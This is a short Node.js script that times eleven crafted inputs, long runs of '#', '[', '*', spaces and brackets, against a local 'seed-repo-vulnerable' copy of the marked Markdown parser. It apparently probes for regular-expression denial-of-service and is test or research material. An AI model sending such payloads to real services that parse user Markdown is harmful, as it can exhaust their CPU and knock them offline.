const marked = require('./seed-repo-vulnerable/node_modules/marked');

const payloads = [
  '#'.repeat(100000) + 'a',
  'a'.repeat(50000) + '  \n',
  '*'.repeat(50000) + 'a',
  '['.repeat(50000) + 'a',
  '[' + 'a'.repeat(50000) + ']()',
  '  '.repeat(10000) + 'a',
  '[' + 'a'.repeat(10000) + ']',
  '- '.repeat(10000) + 'a',
  'a \n\n'.repeat(10000),
  '<'.repeat(50000),
  '[' + ' '.repeat(50000) + ']()'
];

for (let i = 0; i < payloads.length; i++) {
  console.log(`Testing payload ${i}`);
  const start = Date.now();
  try {
    marked(payloads[i]);
    const elapsed = Date.now() - start;
    console.log(`Payload ${i} took ${elapsed}ms`);
  } catch(e) {
    console.log(`Payload ${i} errored`);
  }
}
